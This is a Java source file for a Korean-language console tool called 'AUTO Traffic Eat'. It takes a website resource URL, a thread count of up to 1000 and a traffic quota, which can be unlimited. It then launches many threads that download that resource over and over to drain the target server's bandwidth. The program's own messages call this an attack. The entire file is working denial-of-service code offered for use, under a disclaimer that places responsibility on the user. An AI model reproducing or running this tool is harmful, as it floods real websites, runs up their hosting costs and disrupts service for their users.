import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.util.Scanner;

public class main {
	//전역변수 설정
	static URL url = null;
	static String address = null;
	static int thread = 0;
	static long traffic = 0;
	static int data = 0;
	static URLConnection c = null;
	

	public static void main(String[] args) throws MalformedURLException, InterruptedException {
		Scanner userIn = new Scanner(System.in);
		
		System.out.println("  =-=-=-==-=-=-= AUTO Traffic Eat =-=-=-==-=-=-=");
		System.out.println("  Since 2016 08 14 ");
		System.out.println("  본 프로그램을 사용함으로 인한 모든 책임은 사용자에게 있습니다. ");
		System.out.println("  Version 1.1.0 Beta");
		System.out.println("  =-=-=-==-=-=-==-=-=-==-=-=-==-=-=-==-=-=-=-=-=");
		
		while(true){
			//자원 주소를 입력받습니다.
			while(true){
				System.out.println();
				System.out.println();
			
				System.out.println("[!] 홈페이지에 저장된 파일을 의미하며, 이미지, 웹페이지 등을 말합니다.");
				System.out.print("자원주소 입력 : ");
				address = userIn.nextLine();
				
				if(address.equals("")){
					System.out.println("[!] 자원이 없슴. 다시 입력");
					continue;
				} else {
					break;
				}
			}
			
			//쓰래드 생성량을 입력 받습니다.
			while(true){
				System.out.println();
				System.out.println();
				
				System.out.println("[!] 동시 자원 소모량을 의미하며, 숫자가 클수록 강력하고 빠릅니다.");
				System.out.print("Thread (1 ~ 1000) : ");
				thread = userIn.nextInt();
				
				if(thread <= 0 || thread > 1000){
					System.out.println("[!] 쓰래드가 잘못 작성됨. 다시 입력");
					continue;
				} else {
					break;
				}
			}
			
			//소모할 트래픽을 설정합니다.
			while(true){
				System.out.println();
				System.out.println();
				
				System.out.println("[!] 트래픽(전송량) 소모량이며 0 입력시 무제한, MB 단위로 입력합니다.");
				System.out.print("트래픽 소모량 : ");
				traffic = userIn.nextInt();
				
				if(traffic < 0){
					System.out.println("[!] 용량 설정이 잘못됨. 다시 입력");
					continue;
				} else {
					traffic *= 1024*1024;
					break;
				}
			}
			
			//정보 입력 완료. 정보에 대한것을 저장함.
			try {
				url = new URL(address);
				c = url.openConnection();
				data = c.getContentLength();
			} catch (IOException e) {
				e.printStackTrace();
			}
			
			if(data <= 0){
				//용량이 없거나 너무 작음
				System.out.println("용량이 너무 작습니다. 다른 자원을 선택하세요.");
				try {
					Thread.sleep(2000);
				} catch (InterruptedException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				
				System.exit(0);
			}
			
			System.out.println("=-=-=-=-= Ready =-=-=-=-=");
			System.out.println("대상서버 : " + url.getAuthority());
			System.out.println("프로토콜 : " + url.getProtocol());
			System.out.println("자원주소 : " + url.getFile());
			System.out.println("자원크기 : " + data + "Byte");
			System.out.println("소모크기 : " + traffic / 1024 + "KB");
			System.out.println();
			System.out.print("시작하시겠습니까 ? Y/N : ");
			
			String sure = userIn.nextLine(); //비워두기
			sure = userIn.nextLine();
			
			if(sure.equals("Y") || sure.equals("y")){
				//Y 를 입력하여 시작합니다.
				System.out.println("[!] 공격 시작");
				
				if(traffic == 0){
					int count = 0;
					// 무제한 공격
					while(true){
						for(int i = 0; i < thread; i++){
							//쓰래드를 생성합니다.
							down d = new down(data + i + count);
							d.start();
							Thread.sleep(5);
						}
						count ++;
					}
				} else {
					int count = 0;
					// 제한이 있는 공격
					while(true){
						if(data * count < traffic){
							for(int i = 0; i < thread; i++){
								//쓰래드를 생성합니다.
								down d = new down(data + i + count);
								d.start();
								Thread.sleep(5);
								count ++;
							}
							
						} else {
							break;
						}
					}
				}
			} else {
				System.out.println("[!] 공격 취소.");
				System.exit(0);
			}
			
			if(!(traffic == 0)){
				Thread.sleep(data * traffic / 1048576 / 100);
				//공격 완료 문구
				System.out.println("=-=-=-=-=-= Success =-=-=-=-=-=");
				System.out.println("공격이 완료되었습니다. 다시하시겠습니까?");
				System.out.print("Y/N : ");
				String redo = userIn.nextLine();
				if(redo.equals("Y") || redo.equals("y")){
					continue;
				} else {
					System.out.println("프로그램 종료.");
					break;
				}
			}
		}
	}
}

class down extends Thread{
	private double size;

	down(int size){
		this.size = size;
	}
	
	public void run(){
		try{
			InputStream is = main.url.openStream(); //입력스트림 설정
			InputStreamReader isr = new InputStreamReader(is);
			BufferedReader br = new BufferedReader(isr);
			
			String dir = System.getProperty("user.dir"); // 다운받은 자원을 저장할 공간 설정
			dir = dir + "\\traffic" + this.size + ".swp";
			FileWriter fw = new FileWriter(dir);
			BufferedWriter bw = new BufferedWriter(fw);
			
			String line = br.readLine();
			
			while(line != null){
				bw.write(line);
				line = br.readLine();
			}
			
			System.out.println(main.address + "의 자원 사용 성공 /  " + (int)size/1024 + "KB");
			
			br.close();
			bw.close();
			
		} catch(Exception e){
			System.out.println(main.address + "의 자원 사용 실패 /  " + (int)0 + "KB");
			try {
				System.out.println("소캣 안정화중...");
				Thread.sleep(300);
			} catch (InterruptedException e1) {
				// TODO Auto-generated catch block
				e1.printStackTrace();
			}
		}
	}
}
